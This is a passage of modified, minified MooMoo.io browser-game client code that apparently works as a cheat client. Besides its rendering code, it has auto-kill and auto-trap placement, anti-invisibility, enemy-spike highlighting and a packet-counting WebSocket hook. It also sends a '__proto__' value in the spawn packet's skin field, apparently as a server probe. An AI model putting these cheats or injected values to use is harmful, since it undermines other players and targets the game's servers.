                            13 == t ? rn() : kn() && gn[t] && (gn[t] = 0, mn[t] ? bn() : 32 == t && (O = 0, vn()))
                        }
                    })));
                    var wn = void 0, wne = 0;

                    function bn() {
                        var e = function() {
                            var e = 0,
                                t = 0;
                            if (-1 != re.id) e += re.currentX - re.startX, t += re.currentY - re.startY;
                            else
                                for (var n in mn) {
                                    var i = mn[n];
                                    e += !!gn[n] * i[0], t += !!gn[n] * i[1]
                                }
                            return 0 == e && 0 == t ? void 0 : s.fixTo(Math.atan2(t, e), 2)
                        }();
                        (null == wn || null == e || Math.abs(e - wn) > .3) && (
                            freecam ? camAng = e : (r.send("33", e), wn = e)
                        )
                        if(!isNaN(wn)) {
                            wne = wn;
                        }
                    }

                    function xn() {
                        autoinsta = !autoinsta;
                    }

                    function Sn(e, t) {
                        r.send("5", e, t)
                    }

                    function Tn() {
                        I("moo_name", Le.value), !le && r.connected && (le = !0, x.stop("menu"), dt("Loading..."), r.send("sp", {
                            name: Le.value,
                            moofoll: 1,
                            skin: "__proto__"
                        }))
                    }
                    var In = !0;
                    function En(e) {
                        Pe.style.display = "none", Me.style.display = "block", he.style.display = "none", gn = {}, j = e, O = 0, le = !0, In && (In = !1, N.length = 0)
                    }

                    function Mn(e, t, n, i) {
                        if(!spec) m.showText(e, t, 50, .18, 1900, typeof(n) == "number" ? Math.abs(n) : n, n >= 0 ? "#fff" : "#8ecc51")
                    }
                    var An = 99999;

                    function Pn() {
                        le = !1;
                        try {
                            factorem.refreshAds([2], !0)
                        } catch (e) {}
                        Be.style.display = "none", Qt(), It = {
                            x: R.x,
                            y: R.y
                        }, Pe.style.display = "none", Ge.style.display = "block", Ge.style.fontSize = "0px", An = 0, setTimeout((function() {
                            Me.style.display = "block", he.style.display = "block", Ge.style.display = "none"
                        }), o.deathFadeout), gt()
                    }

                    var playerNames = [];

                    function Bn(e) {
                        R && (nt.removeAllItems(e))
                    }
                    function tryChunk(e){
                        return Math.PI / 180 * e;
                    };

                    function calcAngle(xs, ys, xe, ye) {
                        return Math.atan2(ye - ys, xe - xs);
                    };

                    function fixAngle(a) {
                        return (360 + (a % 360)) % 360;
                    };

                    function Cn(e) {
                        let tmpObj = Mi(e);
                        let angle = i * 8 * ( i % 2 ? - 1 : 1 ) / 180 * Math.PI + nea;
                        for(let i = 0;i<N.length;i++) {
                            if(N[i].sid == e) {
                                if(rubyFarm) {
                                    for(let i = 0; i < 4; i++) dp(R.items[5], Math.PI / 2 * i);
                                } else {
                                    if(enemies && Math.hypot(N[i].y - R.y2, N[i].x - R.x2) < 200) {
                                        if(enemies.length && Math.hypot(enemies[0].y2 - R.y2, enemies[0].x2 - R.x2) < 375) {
                                            if(enemies.length && Math.hypot(enemies[0].y2 - R.y2, enemies[0].x2 - R.x2) < 222) {
                                                dp(R.items[2], nea);
                                            } else {
                                                for (let e = 0; e < 2 * Math.PI * 1.5; e += Math.PI * 1.5 / 2) dp(R.items[4], e);
                                            }
                                        }
                                    }
                                }
                                nt.disableObj(N[i]);
                            }
                        }
                    }

                    function On() {
                        Oe.innerText = R.points, Re.innerText = R.food, je.innerText = R.wood, _e.innerText = R.stone, Ue.innerText = R.kills
                    }
                    var Rn = {},
                        jn = ["crown", "skull"],
                        _n = [];

                    function Un(e, t) {
                        if (R.upgradePoints = e, R.upgrAge = t, e > 0) {
                            _n.length = 0, s.removeAllChildren(Ve);
                            for (var n = 0; n < l.weapons.length; ++n) l.weapons[n].age == t && (null == l.weapons[n].pre || R.weapons.indexOf(l.weapons[n].pre) >= 0) && (s.generateElement({
                                id: "upgradeItem" + n,
                                class: "actionBarItem",
                                onmouseout: function() {
                                    Tt()
                                },
                                parent: Ve
                            }).style.backgroundImage = document.getElementById("actionBarItem" + n).style.backgroundImage, _n.push(n));
                            for (n = 0; n < l.list.length; ++n)
                                if (l.list[n].age == t && (null == l.list[n].pre || R.items.indexOf(l.list[n].pre) >= 0)) {
                                    var i = l.weapons.length + n;
                                    s.generateElement({
                                        id: "upgradeItem" + i,
                                        class: "actionBarItem",
                                        onmouseout: function() {
                                            Tt()
                                        },
                                        parent: Ve
                                    }).style.backgroundImage = document.getElementById("actionBarItem" + i).style.backgroundImage, _n.push(i)
                                } for (n = 0; n < _n.length; n++) ! function(e) {
                                    var t = document.getElementById("upgradeItem" + e);
                                    t.onmouseover = function() {
                                        l.weapons[e] ? Tt(l.weapons[e], !0) : Tt(l.list[e - l.weapons.length])
                                    }, t.onclick = s.checkTrusted((function() {
                                        r.send("6", e)
                                    })), s.hookTouchEvents(t)
                                }(_n[n]);
                            _n.length ? (Ve.style.display = "block", qe.style.display = "block", qe.innerHTML = "SELECT ITEMS (" + e + ")") : (Ve.style.display = "none", qe.style.display = "none", Tt())
                        } else Ve.style.display = "none", qe.style.display = "none", Tt()
                    }

                    function Dn(e, t, n) {
                        null != e && (R.XP = e), null != t && (R.maxXP = t), null != n && (R.age = n), n == o.maxAge ? (ze.innerHTML = "MAX AGE", He.style.width = "100%") : (ze.innerHTML = "AGE " + R.age, He.style.width = R.XP / R.maxXP * 100 + "%")
                    }

                    var Boariajodw = document.getElementById("leaderboard");
                    Boariajodw.append("Sandy Leaderboard");
                    function Ln(e) {
                        s.removeAllChildren(De);
                        for (var t = 1, n = 0; n < e.length; n += 3) ! function(n) {
                            playerNames[e[n]] = "" != e[n + 1] ? e[n + 1] : "unknown";
                            s.generateElement({
                                class: "leaderHolder",
                                parent: De,
                                children: [s.generateElement({
                                    class: "leaderboardItem",
                                    style: "color:" + (e[n] == j ? "#fff" : "rgba(255,255,255,0.6)"),
                                    text: t + ". " + ("" != e[n + 1] ? e[n + 1] : "unknown")
                                }), s.generateElement({
                                    class: "leaderScore",
                                    text: s.kFormat(e[n + 2]) || "0"
                                })]
                            })
                        }(n), t++
                    }

                    function Fn(e, t, n, i) {
                        be.save(), be.setTransform(1, 0, 0, 1, 0, 0), be.scale(V, V);
                        var r = 50;
                        be.beginPath(), be.arc(e, t, r, 0, 2 * Math.PI, !1), be.closePath(), be.fillStyle = "rgba(255, 255, 255, 0.3)", be.fill(), r = 50;
                        var s = n - e,
                            a = i - t,
                            o = Math.sqrt(Math.pow(s, 2) + Math.pow(a, 2)),
                            c = o > r ? o / r : 1;
                        s /= c, a /= c, be.beginPath(), be.arc(e + s, t + a, .5 * r, 0, 2 * Math.PI, !1), be.closePath(), be.fillStyle = "white", be.fill(), be.restore()
                    }

                    function zn(e, t, n) {
                        for (var i = 0; i < G.length; ++i)(_ = G[i]).active && _.layer == e && (_.update(P), _.active && ki(_.x - t, _.y - n, _.scale) &&
                                                                                                (be.save(), be.translate(_.x - t, _.y - n), be.rotate(_.dir), Vn(0, 0, _, be, 1), be.restore()))
                    }
                    var Hn = {};

                    function Vn(e, t, n, i, r) {
                        if (n.src) {
                            var s = l.projectiles[n.indx].src,
                                a = Hn[s];
                            a || ((a = new Image).onload = function() {
                                this.isLoaded = !0
                            }, a.src = tp(".././img/weapons/" + s + ".png"), Hn[s] = a), a.isLoaded && i.drawImage(a, e - n.scale / 2, t - n.scale / 2, n.scale, n.scale)
                        } else 1 == n.indx && (i.fillStyle = "#939393", si(e, t, n.scale, i))
                    }

                    function qn(e, t, n, i) {
                        var r = o.riverWidth + i,
                            s = o.mapScale / 2 - t - r / 2;
                        s < ce && s + r > 0 && n.fillRect(0, s, oe, r)
                    }
                    window.pps = 0;
                    var ppm = 0;
                    WebSocket.prototype.send = new Proxy(WebSocket.prototype.send, {
                        apply(target, socket, packet) {
                            window.pps++, ppm++;
                            setTimeout(() => {
                                window.pps--;
                                setTimeout(() => ppm--, 1e3 * 59);
                                document.querySelector("#ageText").innerHTML = window.pps + " - " + window.pingTime;
                            }, 1e3);
                            return Reflect.apply(target, socket, packet);
                        }
                    });
                    function Yn(e, t, n) {
                        for (var i, r, s, a = 0; a < N.length; ++a)
                            (_ = N[a]).active && (r = _.x + _.xWiggle - t, s = _.y + _.yWiggle - n,
                                                  0 == e && _.update(P),
                                                  _.layer == e && ki(r, s, _.scale + (_.blocker || 0)) &&
                                                  (be.globalAlpha = _.hideFromEnemy ? .6 : 1, _.isItem ? (i = ri(_),
                                                                                                          be.save(),
                                                                                                          be.translate(r, s),
                                                                                                          be.rotate(antiInvis(_.dir)),
                                                                                                          be.drawImage(i, -i.width / 2, -i.height / 2),
                                                                                                          /spik/.test(_.name) && fz && _.owner && (be.globalAlpha = 1,
                                                                                                                                                   be.fillStyle = (_.owner.sid == R.sid || Pt.includes(_.owner.sid)) ? "rgba(0, 0, 0, 0)" : "#A53F3F",
                                                                                                                                                   si(0, 0, _.scale / 3.2, be, true, false)),
                                                                                                          /spik/.test(_.name) && rv2 && _.owner && (be.globalAlpha = 1,
                                                                                                                                                    be.fillStyle = (_.owner.sid == R.sid || Pt.includes(_.owner.sid)) ? "rgba(0, 0, 0, 0)" : "#A53F3F",
                                                                                                                                                    si(0, 0, _.scale / 3.2, be, true, false)),
                                                                                                          _.blocker && (be.strokeStyle = "#db6e6e",
                                                                                                                        be.globalAlpha = .3,
                                                                                                                        be.lineWidth = 6,
                                                                                                                        si(0, 0, _.blocker, be, !1, !0)),
                                                                                                          be.restore()) : (i = ni(_),
                                                                                                                           be.drawImage(i, r - i.width / 2, s - i.height / 2))));
                    }

                    var mlh = Date.now();

                    function Wn(e, t, n) {
                        (_ = Ii(e)) && _.startAnim(t, n), l.hitPlayers.push(e), (_.sid == R.sid && (mlh = Date.now()))
                    }

                    function Xn(e, t, n) {
                        be.globalAlpha = 1;
                        for (var i = 0; i < W.length; ++i)(_ = W[i]).zIndex == n && (_.animate(P), _.visible &&
                                                                                     (_.skinRot += .002 * P, L = (
                            _.sid == R.sid && !ae86 && (!spec ? true : !(fz||1)) ? false ? pn() : aa ? nea : autobreak.h ? fz ? pn() : autobreak.a : pn() : _.dir
                        ) + _.dirPlus, be.save(), be.translate(_.x - e, _.y - t), be.rotate(L), Nn(_, be), be.restore()))
                    }

                    function Nn(e, t) {
                        (t = t || be).lineWidth = vs ? 2 : 5.5, t.lineJoin = "miter";
                        var n = Math.PI / 4 * (l.weapons[e.weaponIndex].armS || 1),
                            i = e.buildIndex < 0 && l.weapons[e.weaponIndex].hndS || 1,
                            r = e.buildIndex < 0 && l.weapons[e.weaponIndex].hndD || 1;
                        if (e.tailIndex > 0 && function(e, t, n) {
                            if (!(Gn = Qn[e])) {
                                var i = new Image;
                                i.onload = function() {
                                    this.isLoaded = !0, this.onload = null
                                }, i.src = tp(".././img/accessories/access_" + e + ".png"), Qn[e] = i, Gn = i
                            }
                            var r = $n[e];
                            if (!r) {
                                for (var s = 0; s < tt.length; ++s)
                                    if (tt[s].id == e) {
                                        r = tt[s];
                                        break
                                    } $n[e] = r
                            }
                            Gn.isLoaded && (t.save(), t.translate(-20 - (r.xOff || 0), 0), r.spin && t.rotate(n.skinRot), t.drawImage(Gn, -r.scale / 2, -r.scale / 2, r.scale, r.scale), t.restore())
                        }(e.tailIndex, t, e), e.buildIndex < 0 && !l.weapons[e.weaponIndex].aboveHand && (ei(l.weapons[e.weaponIndex], o.weaponVariants[e.weaponVariant].src, e.scale, 0, t), null == l.weapons[e.weaponIndex].projectile || l.weapons[e.weaponIndex].hideProjectile || Vn(e.scale, 0, l.projectiles[l.weapons[e.weaponIndex].projectile], be)), t.fillStyle = o.skinColors[e.skinColor], si(e.scale * Math.cos(n), e.scale * Math.sin(n), 14), si(e.scale * r * Math.cos(-n * i), e.scale * r * Math.sin(-n * i), 14), e.buildIndex < 0 && l.weapons[e.weaponIndex].aboveHand && (ei(l.weapons[e.weaponIndex], o.weaponVariants[e.weaponVariant].src, e.scale, 0, t), null == l.weapons[e.weaponIndex].projectile || l.weapons[e.weaponIndex].hideProjectile || Vn(e.scale, 0, l.projectiles[l.weapons[e.weaponIndex].projectile], be)), e.buildIndex >= 0) {
                            var s = ri(l.list[e.buildIndex]);
                            t.drawImage(s, e.scale - l.list[e.buildIndex].holdOffset, -s.width / 2)
                        }
                        si(0, 0, e.scale, t);
                        t.globalAlpha = 1
                        e.skinIndex > 0 && (t.rotate(Math.PI / 2), function e(t, n, i, r) {
                            if (!(Gn = Jn[t])) {
                                var s = new Image;
                                s.onload = function() {
                                    this.isLoaded = !0, this.onload = null
                                }, s.src = tp(".././img/hats/hat_" + t + ".png"), Jn[t] = s, Gn = s
                            }
                            var a = i || Kn[t];
                            if (!a) {
                                for (var o = 0; o < et.length; ++o)
                                    if (et[o].id == t) {
                                        a = et[o];
                                        break
                                    } Kn[t] = a
                            }
                            Gn.isLoaded && n.drawImage(Gn, -a.scale / 2, -a.scale / 2, a.scale, a.scale), !i && a.topSprite && (n.save(), n.rotate(r.skinRot), e(t + "_top", n, a, r), n.restore())
                        }(e.skinIndex, t, null, e))
                    }
                    var Gn, Jn = {},
                        Kn = {},
                        Qn = {},
                        $n = {},
                        Zn = {};

                    function ei(e, t, n, i, r) {
                        var s = e.src + (t || ""),
                            a = Zn[s];
                        a || ((a = new Image).onload = function() {
                            this.isLoaded = !0
                        }, a.src = tp(".././img/weapons/" + s + ".png"), Zn[s] = a), a.isLoaded && r.drawImage(a, n + e.xOff - e.length / 2, i + e.yOff - e.width / 2, e.length, e.width)
                    }
                    var ti = {};

                    function ni(e) {
                        var t = e.y >= o.mapScale - o.snowBiomeTop ? 2 : e.y <= o.snowBiomeTop ? 1 : 0,
                            n = e.type + "_" + e.scale + "_" + t + "_" + vs,
                            i = ti[n];
                        if (!i) {
                            var r = document.createElement("canvas");
                            r.width = r.height = 2.1 * e.scale + 5.5;
                            var a = r.getContext("2d");
                            if (a.translate(r.width / 2, r.height / 2), a.rotate(s.randFloat(0, Math.PI)), a.strokeStyle = it, a.lineWidth = vs ? 2 : 5.5, 0 == e.type)
                                for (var c, l = 0, clrs = [
                                    ["#b1d959", "#95b946"]
                                    , ["#bade6e", "#aac76b"]
                                    , ["#a7d544", "#86a63f"]
                                    , ["#b4db62", "#9ebf57"]
                                ]
                                     , clr = clrs[Math.floor(Math.random() * clrs.length)]; l < 2; ++l) ai(a, 7, c = _.scale * (l ? .5 : 1), .7 * c), a.fillStyle = t ? l ? "#fff" : "#e3f1f4" : l ? clr[0] : clr[1], a.fill(), l || a.stroke();
                            else if (1 == e.type)
                                if (2 == t) a.fillStyle = "#606060", ai(a, 6, .3 * e.scale, .71 * e.scale), a.fill(), a.stroke(), a.fillStyle = "#89a54c", si(0, 0, .55 * e.scale, a), a.fillStyle = "#a5c65b", si(0, 0, .3 * e.scale, a, !0);
                                else {
                                    var h;
                                    ! function(e, t, n, i) {
                                        var r, a = Math.PI / 2 * 3,
                                            o = Math.PI / 6;
                                        e.beginPath(), e.moveTo(0, -i);
                                        for (var c = 0; c < 6; c++) r = s.randInt(n + .9, 1.2 * n), e.quadraticCurveTo(Math.cos(a + o) * r, Math.sin(a + o) * r, Math.cos(a + 2 * o) * i, Math.sin(a + 2 * o) * i), a += 2 * o;
                                        e.lineTo(0, -i), e.closePath()
                                    }(a, 0, _.scale, .7 * _.scale), a.fillStyle = t ? "#e3f1f4" : "#89a54c", a.fill(), a.stroke(), a.fillStyle = t ? "#6a64af" : "#c15555";
                                    var u = T / 4;
                                    for (l = 0; l < 4; ++l) si((h = s.randInt(_.scale / 3.5, _.scale / 2.3)) * Math.cos(u * l), h * Math.sin(u * l), s.randInt(10, 12), a)
                                }
                            else 2 != e.type && 3 != e.type || (a.fillStyle = 2 == e.type ? 2 == t ? "#938d77" : "#939393" : "#e0c655", ai(a, 3, e.scale, e.scale), a.fill(), a.stroke(), a.fillStyle = 2 == e.type ? 2 == t ? "#b2ab90" : "#bcbcbc" : "#ebdca3", ai(a, 3, .55 * e.scale, .65 * e.scale), a.fill());
                            i = r, ti[n] = i
                        }
                        return i
                    }
                    var ii = [];

                    function ri(e, t) {
                        let clr = R && e.owner && (e.owner.sid).constructor == Number && e.owner.sid != R.sid,
                            use = !ae86 && !spec && vs,
                            ID = e.id + (!use && clr ? 50 : 0);
                        var n = ii[ID];
                        if (!n || t) {
                            var i = document.createElement("canvas");
                            i.width = i.height = 2.5 * e.scale + 5.5 + (l.list[e.id].spritePadding || 0);
                            var r = i.getContext("2d");
                            if (r.translate(i.width / 2, i.height / 2),
                                r.rotate(t ? 0 : Math.PI / 2),
                                r.strokeStyle = it,
                                r.lineWidth = (vs ? 2 : 5.5) * (t ? i.width / 81 : 1),
                                "apple" == e.name) {
                                r.fillStyle = "purple",
                                    si(0, 0, e.scale, r),
                                    r.fillStyle = "pink";
                                var a = -Math.PI / 2;
                                !function(e, t, n, i, r) {
                                    var s = e + 25 * Math.cos(i)
                                    , a = t + 25 * Math.sin(i);
                                    r.moveTo(e, t),
                                        r.beginPath(),
                                        r.quadraticCurveTo((e + s) / 2 + 10 * Math.cos(i + Math.PI / 2), (t + a) / 2 + 10 * Math.sin(i + Math.PI / 2), s, a),
                                        r.quadraticCurveTo((e + s) / 2 - 10 * Math.cos(i + Math.PI / 2), (t + a) / 2 - 10 * Math.sin(i + Math.PI / 2), e, t),
                                        r.closePath(),
                                        r.fill(),
                                        r.stroke()
                                }(e.scale * Math.cos(a), e.scale * Math.sin(a), 0, a + Math.PI / 2, r)
                            } else if ("cookie" == e.name) {
                                r.fillStyle = "#cca861",
                                    si(0, 0, e.scale, r),
                                    r.fillStyle = "#937c4b";
                                for (var o = T / (h = 4), c = 0; c < h; ++c)
                                    si((u = s.randInt(e.scale / 2.5, e.scale / 1.7)) * Math.cos(o * c), u * Math.sin(o * c), s.randInt(4, 5), r, !0)
                            } else if ("cheese" == e.name) {
                                var h, u;
                                for (r.fillStyle = "#f4f3ac",
                                     si(0, 0, e.scale, r),
                                     r.fillStyle = "#c3c28b",
                                     o = T / (h = 4),
                                     c = 0; c < h; ++c)
                                    si((u = s.randInt(e.scale / 2.5, e.scale / 1.7)) * Math.cos(o * c), u * Math.sin(o * c), s.randInt(4, 5), r, !0)
                            } else if ("wood wall" == e.name || "stone wall" == e.name || "castle wall" == e.name) {
                                r.fillStyle = "castle wall" == e.name ? "#83898e" : "wood wall" == e.name ? "#a5974c" : "#939393";
                                var f = "castle wall" == e.name ? 4 : 3;
                                ai(r, f, 1.1 * e.scale, 1.1 * e.scale),
                                    r.fill(),
                                    r.stroke(),
                                    r.fillStyle = "castle wall" == e.name ? "#9da4aa" : "wood wall" == e.name ? "#c9b758" : "#bcbcbc",
                                    ai(r, f, .65 * e.scale, .65 * e.scale),
                                    r.fill()
                            } else if ("spikes" == e.name || "greater spikes" == e.name || "poison spikes" == e.name || "spinning spikes" == e.name) {
                                r.fillStyle = "poison spikes" == e.name ? "#7b935d" : "#939393";
                                var d = .6 * e.scale;
                                ai(r, "spikes" == e.name ? 5 : 6, e.scale, d),
                                    r.fill(),
                                    r.stroke(),
                                    r.fillStyle = "yellow",
                                    si(0, 0, d, r),
                                    r.fillStyle = (use && clr ? "yellow" : "yellow"),
                                    r.globalAlpha = 1, si(0, 0, e.scale, r, 10, 100),
                                    si(0, 0, d / 2, r, !0)
                            } else if ("pit trap" == e.name)
                                r.fillStyle = "cyan",
                                    ai(r, 3, 1.1 * e.scale, 1.1 * e.scale),
                                    r.fill(),
                                    r.stroke(),
                                    r.fillStyle = (use && clr ? "red" : it), r.globalAlpha = 1, si(0, 0, e.scale, r, 10, 100),
                                    ai(r, 3, .65 * e.scale, .65 * e.scale),
                                    r.fill();
                            else if ("windmill" == e.name || "faster windmill" == e.name || "power mill" == e.name)
                                r.fillStyle = "orange",
                                    si(0, 0, e.scale, r),
                                    r.fillStyle = "brown",
                                    ci(0, 0, 1.5 * e.scale, 29, 4, r),
                                    r.fillStyle = "yellow",
                                    si(0, 0, .5 * e.scale, r);
                            else if ("mine" == e.name)
                                r.fillStyle = "blue",
                                    ai(r, 3, e.scale, e.scale),
                                    r.fill(),
                                    r.stroke(),
                                    r.fillStyle = "purple",
                                    ai(r, 3, .55 * e.scale, .65 * e.scale),
                                    r.fill();
                            else if ("sapling" == e.name)
                                for (c = 0; c < 2; ++c)
                                    ai(r, 7, d = e.scale * (c ? .5 : 1), .7 * d),
                                        r.fillStyle = c ? "#b4db62" : "#9ebf57",
                                        r.fill(),
                                        c || r.stroke();
                            else if ("boost pad" == e.name)
                                r.fillStyle = "#7e7f82",
                                    oi(0, 0, 2 * e.scale, 2 * e.scale, r),
                                    r.fill(),
                                    r.stroke(),
                                    r.fillStyle = "#dbd97d",
                                    function(e, t) {
                                    t = t || be;
                                    var n = e * (Math.sqrt(3) / 2);
                                    t.beginPath(),
                                        t.moveTo(0, -n / 2),
                                        t.lineTo(-e / 2, n / 2),
                                        t.lineTo(e / 2, n / 2),
                                        t.lineTo(0, -n / 2),
                                        t.fill(),
                                        t.closePath()
                                }(1 * e.scale, r);
                            else if ("turret" == e.name)
                                r.fillStyle = "#a5974c",
                                    si(0, 0, e.scale, r),
                                    r.fill(),
                                    r.stroke(),
                                    r.fillStyle = "#939393",
                                    oi(0, -25, .9 * e.scale, 50, r),
                                    si(0, 0, .6 * e.scale, r),
                                    r.fill(),
                                    r.stroke();
                            else if ("platform" == e.name) {
                                r.fillStyle = "#cebd5f";
                                var p = 2 * e.scale
                                , g = p / 4
                                , m = -e.scale / 2;
                                for (c = 0; c < 4; ++c)
                                    oi(m - g / 2, 0, g, 2 * e.scale, r),
                                        r.fill(),
                                        r.stroke(),
                                        m += p / 4
                            } else
                                "healing pad" == e.name ? (r.fillStyle = "#7e7f82",
                                                           oi(0, 0, 2 * e.scale, 2 * e.scale, r),
                                                           r.fill(),
                                                           r.stroke(),
                                                           r.fillStyle = "#db6e6e",
                                                           ci(0, 0, .65 * e.scale, 20, 4, r, !0)) : "spawn pad" == e.name ? (r.fillStyle = "#7e7f82",
                                                                                                                             oi(0, 0, 2 * e.scale, 2 * e.scale, r),
                                                                                                                             r.fill(),
                                                                                                                             r.stroke(),
                                                                                                                             r.fillStyle = "#71aad6",
                                                                                                                             si(0, 0, .6 * e.scale, r)) : "blocker" == e.name ? (r.fillStyle = "#7e7f82",
                si(0, 0, e.scale, r),
                r.fill(),
                r.stroke(),
                r.rotate(Math.PI / 4),
                r.fillStyle = "#db6e6e",
                ci(0, 0, .65 * e.scale, 20, 4, r, !0)) : "teleporter" == e.name && (r.fillStyle = "#7e7f82",
                                                                                    si(0, 0, e.scale, r),
                                                                                    r.fill(),
                                                                                    r.stroke(),
                                                                                    r.rotate(Math.PI / 4),
                                                                                    r.fillStyle = "#d76edb",
                                                                                    si(0, 0, .5 * e.scale, r, !0));
                            if(fz) {
                                t || (r.fillStyle = (R && e.owner && e.owner.sid == R.sid ? "" : (e.owner && R && R.team && !Pt.includes(e.owner.sid) ? it : "#A53F3F")))
                            } else if(rv2) {
                                t || (r.fillStyle = (R && e.owner && e.owner.sid == R.sid ? "" : (e.owner && R && R.team && !Pt.includes(e.owner.sid) ? it : "#A53F3F")))
                            }
                            (e.name.includes("pit trap") && r.fill()),
                                n = i,
                                t || (ii[ID] = n)
                        }
                        return n
                    }
                    function si(e, t, n, i, r, s) {
                        (i = i || be).beginPath(), i.arc(e, t, n, 0, 2 * Math.PI), s || i.fill(), r || i.stroke()
                    }

                    function ai(e, t, n, i) {
                        var r, s, a = Math.PI / 2 * 3,
                            o = Math.PI / t;
                        e.beginPath(), e.moveTo(0, -n);
                        for (var c = 0; c < t; c++) r = Math.cos(a) * n, s = Math.sin(a) * n, e.lineTo(r, s), a += o, r = Math.cos(a) * i, s = Math.sin(a) * i, e.lineTo(r, s), a += o;
                        e.lineTo(0, -n), e.closePath()
                    }

                    function oi(e, t, n, i, r, s) {
                        r.fillRect(e - n / 2, t - i / 2, n, i), s || r.strokeRect(e - n / 2, t - i / 2, n, i)
                    }

                    function ci(e, t, n, i, r, s, a) {
                        s.save(), s.translate(e, t), r = Math.ceil(r / 2);
                        for (var o = 0; o < r; o++) oi(0, 0, 2 * n, i, s, a), s.rotate(Math.PI / r);
                        s.restore()
                    }

                    function li(e) {
                        for (var t = 0; t < e.length;) nt.add(e[t], e[t + 1], e[t + 2], e[t + 3], e[t + 4], e[t + 5], l.list[e[t + 6]], !0, e[t + 7] >= 0 ? {
                            sid: e[t + 7]
                        } : null), t += 8
                    }

                    function hi(e, t) {

                        let _ = null;

                        (_ = Mi(t)) && (_.xWiggle += o.gatherWiggle * Math.cos(e), _.yWiggle += o.gatherWiggle * Math.sin(e))

                        new Promise((res) => {
                            hitBuilds.push({
                                x: _.x,
                                y: _.y,
                                hitAngle: t,
                                gTime: Date.now(),
                                resolve: res
                            });
                            setTimeout(res, 300, null);
                        }).then(function(bDmg){
                            if(bDmg === null) {
                                return;
                            } else {
                                _.changeHealth(-bDmg);
                            };
                        });

                    }

                    var hitBuilds = [];

                    function ui(e, t) {
                        (_ = Mi(e)) && (_.dir = t, _.xWiggle += o.gatherWiggle * Math.cos(t + Math.PI), _.yWiggle += o.gatherWiggle * Math.sin(t + Math.PI))
                    }

                    function fi(e, t, n, i, r, s, a, o) {
                        lt && (findProj(e,t,n,i,r), J.addProjectile(e, t, n, i, r, s, null, null, a).sid = o)
                    }

                    async function Paths(x,y,d,t) {
                        if(!t) return;
                        let e = t.speed * 111, n = t.range, p = [];
                        while (!0) {
                            let c = [x+n*Math.cos(d), y+n*Math.sin(d)];
                            if(nearBuilds.some(e => Math.hypot(e.y - c[1], e.x - c[0]) < e.scale)) {
                                break;
                            }
                            p.push(c);
                            n -= e;
                            if(n <= 0) {
                                break;
                            }
                        }
                    }

                    async function findProj(x, y, dir, range, speed) {
                        if(speed == 1.5) {} else {
                            x -= 70*Math.cos(dir), y -= 70*Math.sin(dir);
                        }
                        let foundusers = [];
                        for(let i = 0;i<W.length;i++) (_ = W[i]) && (Math.hypot(_.y2 - y, _.x2 - x) < 80) && foundusers.push([_.sid, speed, [x , y, dir, range, speed]])
                        l.projFounds.push(foundusers);
                        await Paths(x,y,dir,l.projectiles.find(e => e.speed && e.speed == speed));
                    }

                    function di(e, t) {
                        for (var n = 0; n < G.length; ++n) G[n].sid == e && (G[n].range = t)
                    }

                    function pi(e) {
                        (_ = Ei(e)) && _.startAnim()
                    }

                    function gi(e) {
                        for (var t = 0; t < Y.length; ++t) Y[t].forcePos = !Y[t].visible, Y[t].visible = !1;
                        if (e) {
                            var n = Date.now();
                            for (t = 0; t < e.length;)(_ = Ei(e[t])) ? (_.index = e[t + 1], _.t1 = void 0 === _.t2 ? n : _.t2, _.t2 = n, _.x1 = _.x, _.y1 = _.y, _.x2 = e[t + 2], _.y2 = e[t + 3], _.d1 = void 0 === _.d2 ? e[t + 4] : _.d2, _.d2 = e[t + 4], _.health = e[t + 5], _.dt = 0, _.visible = !0) : ((_ = Z.spawn(e[t + 2], e[t + 3], e[t + 4], e[t + 1])).x2 = _.x, _.y2 = _.y, _.d2 = _.dir, _.health = e[t + 5], Z.aiTypes[e[t + 1]].name || (_.name = o.cowNames[e[t + 6]]), _.forcePos = !0, _.sid = e[t], _.visible = !0), t += 7
                        }
                    }
                    var mi = {};

                    function yi(e, t) {
                        var n = e.index,
                            i = mi[n];
                        if (!i) {
                            var r = new Image;
                            r.onload = function() {
                                this.isLoaded = !0, this.onload = null
                            }, r.src = tp(".././img/animals/" + e.src + ".png"), i = r, mi[n] = i
                        }
                        if (i.isLoaded) {
                            var s = 1.2 * e.scale * (e.spriteMlt || 1);
                            t.drawImage(i, -s, -s, 2 * s, 2 * s)
                        }
                    }

                    function ki(e, t, n) {
                        return e + n >= 0 && e - n <= oe && t + n >= 0 && t - n <= ce
                    }

                    function vi(e, t) {
                        var n = function(e) {
                            for (var t = 0; t < W.length; ++t)
                                if (W[t].id == e) return W[t];
                            return null
                        }(e[0]);
                        n || (n = new u(e[0], e[1], o, s, J, nt, W, Y, l, et, tt), W.push(n)), n.spawn(t ? H : null), n.visible = !1, n.x2 = void 0, n.y2 = void 0, n.setData(e), t && (U = (R = n).x, D = R.y, $t(), On(), Dn(), Un(0), Be.style.display = "block", bullTick = l.ticks)
                    }

                    function wi(e) {
                        for (var t = 0; t < W.length; t++)
                            if (W[t].id == e) {
                                W.splice(t, 1);
                                break
                            }
                    }

                    function bi(e, t) {
                        R && (R.itemCounts[e] = t)
                    }

                    function xi(e, t, n) {
                        R && (R[e] = t, n && On())
                    }




                    var trackers = [];


                    const DRZOMBOSS = "https://cdn.discordapp.com/attachments/983211411444490280/1136114583619240016/latest.png";
                    let potential = {
                        done: false,
                        health: 100,
                        dmg: 0,
                        enemy: {},
                        pDmg: 0,
                        log(text) {
                            console.log(text);
                        },
                        foodType(type) {
                            switch (type) {
                                case "cookie":
                                    return 40;
                                case "apple":
                                    return 20;
                            }
                        },
                        init(obj, health, dmg, ne) {
                            this.done = true;
                            this.health = health;
                            this.dmg = dmg;
                            this.enemy = ne;
                            this.calculate(this.dmg, this.enemy);
                        },
                        hats(emp, pDmg) { // Configures the hats you equip during the heal
                            nochangeskin = true;
                            emp ? Hg(22, 11) : Hg(6, 11);
                            //heal here
                            console.log(emp);

                            this.heal(pDmg);
                            console.log(pDmg);
                            nextTickDo(function() {
                                nextTickDo(function() {
                                    nochangeskin = false;
                                });
                            });
                        },
                        find(ne) { // Find all dmgs, then sort into an array
                            let temp = [];
                            let reloads = [null, true, true, true];
                            let Rx = {x: R.speed * Math.cos(R.moveDir - Math.PI) + R.x2, y: R.speed * Math.sin(R.moveDir - Math.PI) + R.y2, scale: 35};
                            let spikeTypes = N.filter(c => c.active && c.isItem && c.owner.sid != R.sid && (!R.team || !Tribe(c.owner.sid)) && [6, 7, 8, 9].includes(c.id) && !c.ignoreCollision && onBuild(Rx, c));
                            if(ne) {
                                if(ne.primaryReload === 1) {
                                    reloads[1] = true;
                                } else if(ne.secondaryReload === 1) {
                                    reloads[2] = true;
